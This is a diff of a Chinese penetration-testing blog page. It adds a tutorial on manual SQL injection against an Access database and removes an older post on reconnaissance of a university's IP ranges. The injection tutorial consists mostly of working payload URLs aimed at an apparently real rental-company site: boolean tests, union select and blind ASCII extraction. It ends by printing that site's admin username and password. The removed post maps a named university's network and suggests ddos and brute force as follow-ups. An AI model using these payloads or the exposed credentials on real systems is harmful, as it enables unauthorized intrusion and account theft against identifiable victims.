@@ -157,6 +157,74 @@
 
     <div class="post-header index">
         <h1 class="title">
+            <a href="/2016/05/10/access-manual-injection/">
+                sql注入入门 之 access常规注入 [ union方式 ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-05-10</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/all-sql-injection/">all sql injection</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>0x01 用于演示的常规 access 实例注入点,如下,可以看到,正常情况下的页面是这样的:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vlun.com/dauphin</span>-island-vacation-rentals-details.asp?id=<span class="number">240</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/access_1.jpg" alt="&quot;正常情况下的页面&quot;"><br></p>
+<p>0x02 尝试 <code>’</code> 干扰后,数据库如期报错,其实在错误里面就已经说的很清楚了,是access的数据库,错误的原因是多了个单引号导致的,既是如此,则证明我们的单引号刚刚已被带入了正常查询,这也正是我们想要看到的效果<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vlun.com/dauphin</span>-island-vacation-rentals-details.asp?id=<span class="number">240</span><span class="string">'</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/access_2.jpg" alt="&quot;数据库报错&quot;"><br></p>
+<p>0x03 再次确认是否真的存在注入,我们观察到,条件为真时页面返回正常<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vlun.com/dauphin</span>-island-vacation-rentals-details.asp?id=<span class="number">240</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/access_3.jpg" alt="&quot;条件为真返回正常&quot;"><br></p>
+<p>0x04 条件为假时页面返回错误,确认无疑,这是个标标准准的access数字型注入点,紧接着我们就可以开始正常查询各种数据了,关于注入access,暂时也看到没什么特别好的办法,表名字段名只能硬猜<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vlun.com/dauphin</span>-island-vacation-rentals-details.asp?id=<span class="number">240</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">112</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/access_4.jpg" alt="&quot;条件为假时返回错误&quot;"><br></p>
+<p>0x05 首先,尝试猜管理表名,当然,这中间肯定还尝试了很多其它可能的管理表名,比如,admin,login,admin_user等等……直到我们尝试到<code>users</code>表时页面才返回正常,说明该表存在<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vlun.com/dauphin</span>-island-vacation-rentals-details.asp?id=<span class="number">240</span> <span class="keyword">and</span> exists(select * from users)</div></pre></td></tr></table></figure></p>
+<p><img src="/img/access_5.jpg" alt="&quot;猜管理表名&quot;"><br></p>
+<p>0x06 有了管理表名,接着就该猜该表中对应的用户和密码字段名了,当我们尝试 <code>username</code> 字段时,页面返回正常,说明该字段名存在<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vlun.com/dauphin</span>-island-vacation-rentals-details.asp?id=<span class="number">240</span> <span class="keyword">and</span> exists(select username from users)</div></pre></td></tr></table></figure></p>
+<p><img src="/img/access_6.jpg" alt="&quot;猜账号字段名&quot;"><br></p>
+<p>0x07 用户名字段有了,下面该轮到猜密码字段名了,同样,当我们尝试 <code>password</code> 字段名时页面返回正常,说明该字段名也存在<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vlun.com/dauphin</span>-island-vacation-rentals-details.asp?id=<span class="number">240</span> <span class="keyword">and</span> exists(select password from users)</div></pre></td></tr></table></figure></p>
+<p><img src="/img/access_7.jpg" alt="&quot;猜密码字段名&quot;"><br></p>
+<p>0x08 目前为止,表名,字段名都有了,理论上,紧接着直接去爆出相应的数据即可,不过,在爆数据之前,我们还需要先确定当前表的字段个数,后面好执行union,然后爆出数据的显示位,这里就用经典的order by ,很显然,为3的时候,页面返回正常<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vlun.com/dauphin</span>-island-vacation-rentals-details.asp?id=<span class="number">240</span> order by <span class="number">3</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/access_8.jpg" alt="&quot;字段为3的时候&quot;"><br></p>
+<p>0x09 为4的时候页面返回错误,按说,当前表的字段个数应该为3个才对<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vlun.com/dauphin</span>-island-vacation-rentals-details.asp?id=<span class="number">240</span> order by <span class="number">4</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/access_9.jpg" alt="&quot;字段为4的时候报错&quot;"><br></p>
+<p>0x10 但实际测试中,它却显示一直不匹配错误,好吧,想要直截了当的爆出数据估计要费点儿劲了,为了不在这里浪费时间,我们只能暂时用类似盲注的办法来一位位字符的截取数据了<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vlun.com/dauphin</span>-island-vacation-rentals-details.asp?id=<span class="number">240</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">23</span> UNION SELECT <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> from users --</div></pre></td></tr></table></figure></p>
+<p><img src="/img/access_10.jpg" alt="&quot;猜密码字段名&quot;"><br></p>
+<p>0x11 在这之前,我们已经确定了用户及密码的字段名和管理表名,所以,我们就可以像下面这样这样来获取数据<br></p>
+<p>0x12 查询 <code>username</code>字段下的第一条数据的长度,当大于7时页面返回正常<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vlun.com/dauphin</span>-island-vacation-rentals-details.asp?id=<span class="number">240</span> <span class="keyword">and</span> (select top <span class="number">1</span> len(username) from users)&gt;<span class="number">7</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/access_10.png" alt="&quot;字段数据长度&quot;"><br></p>
+<p>0x13 大于8时页面返回错误,说明 <code>username</code> 字段下的第一条数据长度为 8 个字符<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vlun.com/dauphin</span>-island-vacation-rentals-details.asp?id=<span class="number">240</span> <span class="keyword">and</span> (select top <span class="number">1</span> len(username) from users)&gt;<span class="number">8</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/access_11.png" alt="&quot;username字段第一条数据的长度&quot;"><br></p>
+<p>0x14 知道了第一条数据的总长度,我们就要可以开始一个一个字符的截取数据了,下面语句的意思是截取<code>username</code>字段的第一条数据的第一位字符并返回其对应的ascii码,可以看到,为98的时候页面返回正常,而98对应的ASCII码字符是<code>b</code><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vlun.com/dauphin</span>-island-vacation-rentals-details.asp?id=<span class="number">240</span> <span class="keyword">and</span> (select top <span class="number">1</span> asc(mid(username,<span class="number">1</span>,<span class="number">1</span>)) from users)=<span class="number">98</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/access_12.png" alt="&quot;返回username字段第一条数据的第一个字符的ascii码值&quot;"><br></p>
+<p>0x15 截取<code>username</code>字段的第一条数据的第二个字符并返回其对应的ascii码,为119时页面返回正常,而119对应的字符为<code>w</code><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vlun.com/dauphin</span>-island-vacation-rentals-details.asp?id=<span class="number">240</span> <span class="keyword">and</span> (select top <span class="number">1</span> asc(mid(username,<span class="number">2</span>,<span class="number">1</span>)) from users)=<span class="number">119</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/access_13.png" alt="&quot;第二个字符的ASCII码值&quot;"><br></p>
+<p>最后,通过慢慢遍历,<code>username</code> 字段的第一条记录的完整数据为<code>bwrealty</code><br></p>
+<p>0x16 <code>username</code>字段查完了,下面又该轮到<code>password</code>字段了,还是一模一样的方法</p>
+<p>截取<code>password</code>字段的第一条数据的第一位字符,并返回其对应的ascii码,直到为98时页面猜返回正常<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.boardwalk-realty.com/dauphin</span>-island-vacation-rentals-details.asp?id=<span class="number">240</span> <span class="keyword">and</span> (select top <span class="number">1</span> asc(mid(password,<span class="number">1</span>,<span class="number">1</span>)) from users)=<span class="number">98</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/acpass1.png" alt="&quot;第一个字符的ASCII码值&quot;"><br></p>
+<p>截取password字段的第一条数据的第二位字符,并返回其对应的ascii码,直到为119时页面猜返回正常<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.boardwalk-realty.com/dauphin</span>-island-vacation-rentals-details.asp?id=<span class="number">240</span> <span class="keyword">and</span> (select top <span class="number">1</span> asc(mid(password,<span class="number">2</span>,<span class="number">1</span>)) from users)=<span class="number">119</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/acpass2.png" alt="&quot;第二个字符的ASCII码值&quot;"><br></p>
+<p><code>password</code>字段第一条数据的最终结果为<code>bwrealty123</code>,至此,整个access的常规注入就算基本完成了,大家也都看到了,其实整个注入过程,非常的简单<br><br></p>
+<p>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;针对access的注入,其实真的没什么特别需要注意的,非常简单,因为它没有像mysql,mssql,oracle…那样,直接有提供现成的元数据可以查,表名字段名都只能硬猜,也就是说,如果是字段名猜不着,有后台的情况下,还可以看看后台的登陆表单里的账号密码字段名是什么,然后拿这个来试试,如果压根是表名都猜不着也就猜不着了,没什么曲线可以走,所以,这就需要大家自己平时多去搜集一些命中率相对比较高的管理员表名和账户密码字段名了,另外,因为access数据库,本身就非常小,所以,根本也没有任何权限及用户访问控制机制,自然注入起来也非常的容易,基本上是不用考虑的太多,上手即来<br><br></p>
+
+        </div>
+    
+
+</div>
+
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
             <a href="/2016/04/19/python-basic/">
                 python 速成笔记 [基础语法 一]
             </a>
@@ -1263,65 +1331,6 @@
 <p>0x03 关于旁站/C段工具的基本编写原理<br>&nbsp;&nbsp;&nbsp;&nbsp;现在市面上这类的工具也是多如牛毛,但各有优劣(可能是接口质量的差别吧),但大多数都是用bing的接口,把查询到的结果数据中的旁站链接提取出来,C段和旁站唯一不一样的地方,就是C段是把整个段的ip上的旁站都轮询一遍,不过在此之前你需要先申请一下bing的搜索api,其实我自己都是选择性的用,因为不太准,手工直接在bing里面翻翻可能就有了,因为工具本身有时可能会漏掉很多有价值的参考信息,反正我们的目的就是随便找个能进去的站即可,怎么找,随意,你自己觉得怎么快就怎么来,渗透在乎更多的是结果和效率,过程几乎都不会太在意</p>
 <p>0x04 好了,这部分内容确实比较简单,工具也没太多技术含量,单纯只是为了给大家理解一些基本概念而已,就不多说了</p>
 <p>其实,还有非常多的一些提供类似功能的工具站,之前好用的,现在大多已经失效了,后期遇到好的再贴上来,大家可自行去谷歌上搜搜,确实挺多的,不过大部分似乎并不太好用,另外,大家如果有任何问题或者建议,也可直接私信我,其实,我一直都在<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.sameip.org/</span></div></pre></td></tr></table></figure></p>
-
-        </div>
-    
-
-</div>
-
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2014/12/11/search-ipinfo/">
-                web渗透第一步 之 信息搜集 [ 搜集目标真实ip信息 ]
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2014-12-11</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/信息搜集/">信息搜集</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br><br>0x01 在实际渗透中,给我们的目标可能仅仅就是一个域名或者某个组织名,那么该如何仅仅通过一个目标域名或者组织域名来确定目标所在的一些真实ip段呢,下面我们就开始整个信息搜集任务的第一步,搜集目标ip及域名信息,注意,这里我们暂且先不考虑目标是否用了CDN的问题,如何透过cdn找真实ip在后面会做单独说明,这里就先以正常的情况来说明</p>
-<p>0x02 以<code>www.cityu.edu.hk</code> 为例,拿到目标域名的第一反应,没别的,先ping下目标域名看看解析情况再说<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># ping www.cityu.edu.hk</span></div><div class="line">www.cityu.edu.hk (<span class="number">144.214</span>.<span class="number">5.62</span>) ping 目标主域解析到的ip是这个</div></pre></td></tr></table></figure></p>
-<p>0x03 虽然没ping通,但这并不影响我们看它解析到的ip,不通的原因,还要看它提示的是什么,如果是超时,多半是因为防火墙拦截了imcp请求,不过这并不是重点,重点是我们已经发现这个域名被解析到了这个ip上,而且被解析的这个域名依然是 www.cityu.edu.hk,其实,从这里基本就已经可以确定这个ip就是目标的真实ip段内的[搞多了,自然就会有感觉],不信的话,我们可以直接尝试在浏览器中访问下解析到的这个ip,看看是不是会自动跳转到www.cityu.edu.hk 这个域名上的网页上,但仅仅就这一个ip还是远远不够的,对一个这种规模的大学来讲,机器肯定不再少数,我们接着往下走……<br><img src="/img/www.cityu.edu.hk.png" alt=""><br></p>
-<p>0x04 ping 完主域,顺手再来ping下子域,依然是没ping通,不过我们看到这个子域也被解析到了这个ip上[很可能是代理服务器或者负载均衡器什么的]<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># ping cityu.edu.hk</span></div><div class="line">cityu.edu.hk (<span class="number">144.214</span>.<span class="number">5.62</span>)</div></pre></td></tr></table></figure></p>
-<p><img src="/img/cityu.edu.hk.png" alt=""></p>
-<p>0x05 通过上面简单的ping,我们已初步发现目标所在的其中一个真实ip段,但仅仅只有这一个段还是远远不够的[像这种规模的大学,几乎整个B段都可能是它的],接着我们可以从目标的mx,ns,a记录入手,至于这些记录具体都是干什么的,这里就不细说了,大家请自行谷歌,因为我们今天的重点并不在这些记录本身,而仅仅是想通过这些记录[子域]获取一些目标的真实ip段,如下,推荐dig,nslookup不太准[非权威查询]<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">查目标的mx记录:</div><div class="line"><span class="comment"># dig +short @8.8.8.8 cityu.edu.hk mx</span></div></pre></td></tr></table></figure></p>
-<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">smtp.cityu.edu.hk (<span class="number">144.214</span><span class="meta">.4</span><span class="meta">.72</span>)  </div><div class="line">很显然,这只是目标的一个子域,根据ping解析到的结果我们发现这个<span class="built_in">ip</span>也确实是香港<span class="built_in">ip</span></div><div class="line">跟ping主域返回的结果是<span class="number">144.214</span><span class="meta">.5</span><span class="meta">.62</span>,貌似是差了一个<span class="string">'C'</span>段,不过,大致可以确定是目标的真实<span class="built_in">ip</span>段</div></pre></td></tr></table></figure>
-<p><img src="/img/cityu mx 1.png" alt=""><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">cityu-edu-hk.mail.protection.outlook.com (<span class="number">65.55</span>.<span class="number">88.234</span>)  </div><div class="line">注意此域名,它并非目标子域,很显然是挂到outlook上的,ip也不是香港的</div><div class="line">所以,此ip对我们实际的渗透意义并不大,可以忽略</div></pre></td></tr></table></figure></p>
-<p><img src="/img/cityu mx 2.png" alt=""><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">查目标ns记录:</div><div class="line"><span class="comment"># dig +short @8.8.8.8 cityu.edu.hk ns</span></div><div class="line">cpccspc.cityu.edu.hk (<span class="number">144.214</span>.<span class="number">5.254</span>) 目标子域,ip和主域处在同一C段中,可以确定为目标真实ip</div></pre></td></tr></table></figure></p>
-<p><img src="/img/cityu ns 1.png" alt=""></p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vax.cityu.edu.hk (<span class="number">144.214</span>.<span class="number">2.1</span>) 目标子域,同处在B段中,初步确定为目标真实ip</div></pre></td></tr></table></figure>
-<p><img src="/img/cityu ns 2.png" alt=""></p>
-<p>cpccux0.cityu.edu.hk (144.214.5.253) 目标子域,ip和主域处在同一C段中,可以确定为目标真实ip<br><img src="/img/cityu ns 3.png" alt=""><br><br></p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">查目标a记录:</div><div class="line"><span class="comment"># dig +short cityu.edu.hk a</span></div><div class="line"><span class="number">144.214</span>.<span class="number">5.62</span>   和直接ping的结果一致,确定为真实ip</div></pre></td></tr></table></figure>
-<p>0x06 当然,你可以从一些第三方网站上获取到目标的一些ip及域名信息,下面就推荐几个自己常用的<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ip138的数据库还是蛮不错的,主要是更新频繁,只需提供一个目标ip或者域名[给子域就好了]即可定位ip所在地</div><div class="line">如果你想把它写到脚本中批量查,它也提供查询接口,付点儿费,然后把接口写到你的脚本中即可</div><div class="line">www.ip138.com</div></pre></td></tr></table></figure></p>
-<p><img src="/img/ip138 ip info res.png" alt=""><br><img src="/img/ip138 ip info.png" alt=""></p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">这是个相对比较老的信息搜集站,直接给个目标子域,它会把目标的一些子域也都列出来</div><div class="line">然后你可以挨个点到每个子域里面再去看该子域详情,域名详情包括这个域名ip变更的历史记录</div><div class="line">[比如,我们发现在www.cityu.edu.hk这个域名上曾经解析到过三个ip,尝试ping下以前的ip看看还在不在</div><div class="line">说不定是个入手点呢],web服务器版本型号,操作系统类型[如果是一些低版本的操作系统,我们可以直接尝试比较经典的漏洞exp,比如iis(<span class="number">2000</span> <span class="number">2003</span>)写等等……]</div><div class="line">域名注册商[如果你想做域名劫持可能会用到],域名所在地等等……</div><div class="line">从结果看到我们看到,主域其实是一台f5负载均衡设备[印证了前面的猜测]</div><div class="line">另外从别的子域里面我们又发现了很多其它的真实ip段</div><div class="line">www.netcraft.com</div></pre></td></tr></table></figure>
-<p><img src="/img/netcraft.com.png" alt=""><br><img src="/img/netcraft.com res.png" alt=""></p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">最后再来查下目标域名的 whois 信息,里面的一些内容对我们渗透也是有一定帮助的,比如,注册时留下的各种联系信息,邮箱,电话,姓名等等...</div><div class="line">www.whois.com/whois</div></pre></td></tr></table></figure>
-<p>whois里面对我们有用的信息可能也就下面这些:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">注册信息中的邮箱,名字,域名注册时间,过期时间以及当前注册状态</div></pre></td></tr></table></figure></p>
-<p><img src="/img/Registrant Contact Information.png" alt=""><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">管理员各种联系信息,包括管理员邮箱电话,传真,各种名字[可以用来制作字典]</div></pre></td></tr></table></figure></p>
-<p><img src="/img/Administrative Contact.png" alt=""><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">目标技术的联系方式,包括邮箱,电话,传真,名称</div></pre></td></tr></table></figure></p>
-<p><img src="/img/Technical Contact.png" alt=""><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">用于解析该域名的所有ns服务器,从这里面我们发现了两个我们之前在ns记录没查到的域名,不过一看,这很显然就不是目标自己的ns服务器,所以,忽略</div></pre></td></tr></table></figure></p>
-<p><img src="/img/Name Servers Information.png" alt=""></p>
-<p>0x07 通过上面的初步搜集,我们大致整理出了下面的一些目标真实ip段,因为段比较多,这里并没有都写上去……,关键是大家的搜集思路清晰就好:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="number">144.214</span>.<span class="number">2.0</span>/<span class="number">24</span></div><div class="line"><span class="number">144.214</span>.<span class="number">4.0</span>/<span class="number">24</span></div><div class="line"><span class="number">144.214</span>.<span class="number">5.0</span>/<span class="number">24</span></div><div class="line"><span class="number">144.214</span>.<span class="number">236.0</span>/<span class="number">24</span></div><div class="line">……</div></pre></td></tr></table></figure></p>
-<p>0x08 到这一步,初步的ip及域名信息搜集就基本算是完成了,内容确实比较简单,关于工具的使用也比较容易,实在不会,看看命令的相关帮助应该就能明白了,可能最需要注意的地方还是 ping 的时候最好多ping几次,有时候因为自己的网速或者目标的网络问题,也会导致超时,并非一定是防火墙的原因,所以,一般ping 个5,6次就差不多了,当然,这里只是大家告诉你怎么手工去找,相信这里的一点铺垫,到后面会更利于你去理解和使用这一类的信息搜集工具,因为它们的工作流程大致都是如此,只不过我们现在是在手工实现它,还是那句话,实际渗透中怎么快怎么来[以效率为重],后面会说到dnsenum,一个脚本基本就可以把上面说的东西全干了……</p>
-<p>0x09 当然啦,这仅仅还是万里长征的第一步,拿到准确的目标ip段信息,也是为了方便我们后面,对目标机器大概的部署情况做一些简要判断,从中找到一些可能的突破口,这中间还会涉及到cdn的问题,不过不用太着急,后面会再专门针对cdn做单独的详细说明,至于拿到这些真实ip信息以后的事情,就自己随意了,旁站,C段,ddos,爆破…………,自己想怎么发挥都行…</p>
-<p>小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;没啥技术含量,方便加深对此类工具的深层理解,顺带留给有需要的朋友<br><br></p>
 
         </div>
     
